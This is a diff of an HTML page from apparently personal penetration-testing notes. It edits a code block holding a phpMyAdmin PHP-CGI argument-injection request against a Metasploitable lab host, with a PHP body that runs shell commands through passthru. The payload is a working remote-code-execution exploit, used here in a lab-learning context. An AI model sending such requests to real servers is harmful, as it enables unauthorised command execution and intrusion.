@@ -241,7 +241,7 @@
 </li>
 <li><p>phpMyAdmin/setup</p>
 <ul>
-<li>MetaSploitable <figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST http:&#x2F;&#x2F;&#x2F;phpMyAdmin&#x2F;?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp:&#x2F;&#x2F;input HTTP&#x2F;1.1<br>Host: 192.168.20.10<br>Content-Length: 40<br>&amp;nbsp;<br>&lt;?php<br>passthru(&#39;pwd&amp;&amp;ls&#39;); <br>die();<br>?&gt;<br></code></pre></td></tr></table></figure>
+<li>MetaSploitable <figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST http:&#x2F;&#x2F;&#x2F;phpMyAdmin&#x2F;?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp:&#x2F;&#x2F;input HTTP&#x2F;1.1<br>Host: 192.168.20.10<br>Content-Length: 40<br><br>&lt;?php<br>passthru(&#39;pwd&amp;&amp;ls&#39;); <br>die();<br>?&gt;<br></code></pre></td></tr></table></figure>
 
 
 
